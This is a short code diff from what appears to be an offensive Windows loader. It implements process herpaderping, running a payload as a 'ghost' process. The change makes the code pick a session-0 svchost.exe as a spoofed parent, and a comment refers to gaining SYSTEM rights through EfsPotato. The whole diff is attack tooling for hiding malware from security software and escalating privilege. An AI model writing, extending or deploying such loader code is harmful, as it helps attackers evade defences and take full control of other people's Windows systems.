@@ -12,7 +12,7 @@
 
 static HANDLE GetNonJobParent()
 {
-	const wchar_t* targets[] = { L"explorer.exe", L"wininit.exe", NULL };
+	const wchar_t* targets[] = { L"svchost.exe", L"wininit.exe", NULL };
 	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (hSnap == INVALID_HANDLE_VALUE) return GetCurrentProcess();
 	PROCESSENTRY32W pe = { sizeof(pe) };
@@ -20,6 +20,9 @@ static HANDLE GetNonJobParent()
 		do {
 			for (int i = 0; targets[i]; i++) {
 				if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
+					DWORD sid = 0xFFFF;
+					ProcessIdToSessionId(pe.th32ProcessID, &sid);
+					if (sid != 0) continue;
 					HANDLE h = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe.th32ProcessID);
 					if (h) { CloseHandle(hSnap); return h; }
 				}
@@ -199,7 +202,7 @@ BOOL Herpaderping(BYTE *payload, size_t payloadSize)
 		exit(-1);
 	}
 
-	// Token fixup: NtCreateProcessEx inherits token from parent (explorer.exe),
+	// Token fixup: NtCreateProcessEx inherits token from parent (svchost.exe via GetNonJobParent),
 	// reassign the calling process token so ghost runs with our identity (SYSTEM if via EfsPotato)
 	{
 		_NtSetInformationProcess pNtSetInformationProcess = (_NtSetInformationProcess)GetProcAddress(
